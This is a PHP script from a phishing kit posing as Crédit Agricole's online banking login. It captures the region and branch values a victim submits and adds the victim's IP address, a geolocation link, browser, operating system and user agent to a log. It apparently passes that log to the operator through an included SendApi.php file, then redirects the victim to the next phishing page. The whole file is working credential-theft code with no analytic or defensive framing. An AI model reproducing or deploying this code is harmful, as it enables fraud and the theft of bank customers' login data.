<?php
error_reporting(0);
session_start();

include("../detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");
	

$region_number = $_SESSION['region_number'] = $_POST['region_number'];
$reisse = $_SESSION['reisse'] = $_POST['reisse'];


$yagmai .= '
[๐ช Saisissez ] = '.$_SESSION['region_number'].'
[๐ฎ region caisse  ] = '.$_SESSION['reisse'].'
    [+]โโโโใ๐ป Systemใโโโ[+]
[๐ IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[โฐ TIME/DATE] ='.$InfoDATE.'
[๐ BROWSER] = '.$brow.' and '.$sys.'
[๐ FINGERPRINT] = '.$useragent.'

';


$yagmail .= '
[+]โโโโโโโโโโโโโโใ Log Agricole ใโโโโโโโโโโโโ[+]
[+]โโโโโโโโโโโโโโโโโโใ๐Loginใโโโโโโโโโโโโโโโโโโโโ[+]
[๐ช Saisissez ] = '.$_SESSION['region_number'].'
[๐ฎ region caisse   ] = '.$_SESSION['reisse'].'
[+]=โโโโโโโโโโโโโโโโโโใ๐ป Systemใโโโโโโโโโโโโโโโโโ[+]
[๐ IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[โฐ TIME/DATE] ='.$InfoDATE.'
[๐ BROWSER] = '.$brow.' and '.$sys.'
[๐ FINGERPRINT] = '.$useragent.'
[+]โโโโโโโโโโโโโโใ End Log ใโโโโโโโโโโโโโโโโโโ[+]
[+]โโโโโโโโโโโโโโใEinstein REZ๐คก๐ใโโโโโโโโโโโโโโโ[+]
';
 
include("SendApi.php"); 


$src="../connect.php";
header("location:$src");

?>